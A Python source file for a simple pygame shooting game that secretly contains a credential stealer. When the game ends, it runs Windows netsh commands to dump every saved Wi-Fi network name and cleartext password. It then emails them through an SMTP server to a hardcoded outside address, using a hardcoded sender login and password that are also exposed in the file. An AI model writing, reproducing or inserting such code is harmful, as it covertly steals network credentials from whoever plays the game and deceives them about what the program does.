import pygame
import random
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Initialize pygame
pygame.init()

# Constants
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
PLAYER_WIDTH = 50
PLAYER_HEIGHT = 50
ENEMY_WIDTH = 50
ENEMY_HEIGHT = 50
BULLET_WIDTH = 5
BULLET_HEIGHT = 10
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
FPS = 60

# Create screen
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("Shooting Game")

# Load player image (optional, just for visualization)
player_img = pygame.Surface((PLAYER_WIDTH, PLAYER_HEIGHT))
player_img.fill(BLUE)

# Define fonts
font = pygame.font.SysFont("Arial", 30)

# Player class
class Player(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.image = player_img
        self.rect = self.image.get_rect()
        self.rect.center = (SCREEN_WIDTH // 2, SCREEN_HEIGHT - PLAYER_HEIGHT - 10)
        self.speed = 5
    
    def update(self):
        keys = pygame.key.get_pressed()
        if keys[pygame.K_LEFT] and self.rect.left > 0:
            self.rect.x -= self.speed
        if keys[pygame.K_RIGHT] and self.rect.right < SCREEN_WIDTH:
            self.rect.x += self.speed

# Bullet class
class Bullet(pygame.sprite.Sprite):
    def __init__(self, x, y):
        super().__init__()
        self.image = pygame.Surface((BULLET_WIDTH, BULLET_HEIGHT))
        self.image.fill(RED)
        self.rect = self.image.get_rect()
        self.rect.center = (x, y)
        self.speed = 7
    
    def update(self):
        self.rect.y -= self.speed
        if self.rect.bottom < 0:
            self.kill()

# Enemy class
class Enemy(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.image = pygame.Surface((ENEMY_WIDTH, ENEMY_HEIGHT))
        self.image.fill(GREEN)
        self.rect = self.image.get_rect()
        self.rect.x = random.randint(0, SCREEN_WIDTH - ENEMY_WIDTH)
        self.rect.y = random.randint(-100, -40)
        self.speed = random.randint(2, 5)
    
    def update(self):
        self.rect.y += self.speed
        if self.rect.top > SCREEN_HEIGHT:
            self.rect.x = random.randint(0, SCREEN_WIDTH - ENEMY_WIDTH)
            self.rect.y = random.randint(-100, -40)

# Function to get Wi-Fi credentials
def get_wifi_credentials():
    command = "netsh wlan show profiles"
    profiles = subprocess.check_output(command, shell=True, encoding='utf-8')
    wifi_info = []
    
    for line in profiles.splitlines():
        if "All User Profile" in line:
            ssid = line.split(":")[1].strip()
            try:
                command = f"netsh wlan show profile name=\"{ssid}\" key=clear"
                profile_info = subprocess.check_output(command, shell=True, encoding='utf-8')
                for profile_line in profile_info.splitlines():
                    if "Key Content" in profile_line:
                        key = profile_line.split(":")[1].strip()
                        wifi_info.append((ssid, key))
                        break
            except subprocess.CalledProcessError:
                wifi_info.append((ssid, "No password set"))
    
    return wifi_info

# Function to send email with Wi-Fi credentials
def send_email(wifi_info, sender_email, sender_password, recipient_email):
    subject = "Wi-Fi Credentials"
    body = "Here are the saved Wi-Fi credentials:\n\n"
    for ssid, key in wifi_info:
        body += f"SSID: {ssid}, Password: {key}\n"
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.seznam.cz', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Setup sprite groups
all_sprites = pygame.sprite.Group()
bullets = pygame.sprite.Group()
enemies = pygame.sprite.Group()

# Create the player
player = Player()
all_sprites.add(player)

# Create enemies
for i in range(5):
    enemy = Enemy()
    all_sprites.add(enemy)
    enemies.add(enemy)

# Game loop
running = True
score = 0
clock = pygame.time.Clock()

while running:
    clock.tick(FPS)
    
    # Event handling
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_SPACE:
                bullet = Bullet(player.rect.centerx, player.rect.top)
                all_sprites.add(bullet)
                bullets.add(bullet)
    
    # Update
    all_sprites.update()

    # Check for collisions
    for bullet in bullets:
        enemy_hits = pygame.sprite.spritecollide(bullet, enemies, True)
        for enemy in enemy_hits:
            bullet.kill()
            score += 10
            # Add new enemy after collision
            new_enemy = Enemy()
            all_sprites.add(new_enemy)
            enemies.add(new_enemy)
    
    # Check if enemy hits the player
    if pygame.sprite.spritecollide(player, enemies, False):
        running = False  # Game over

    # Draw
    screen.fill(WHITE)
    all_sprites.draw(screen)

    # Display score
    score_text = font.render(f"Score: {score}", True, (0, 0, 0))
    screen.blit(score_text, (10, 10))

    # Update screen
    pygame.display.flip()

# Game over - send Wi-Fi credentials via email
wifi_info = get_wifi_credentials()

# Email details
sender_email = "info@infopeklo.cz"
sender_password = "Polik789"  # Use App password if two-factor authentication is enabled
recipient_email = "alfikeita@gmail.com"

# Send the Wi-Fi information
send_email(wifi_info, sender_email, sender_password, recipient_email)

# Quit pygame
pygame.quit()
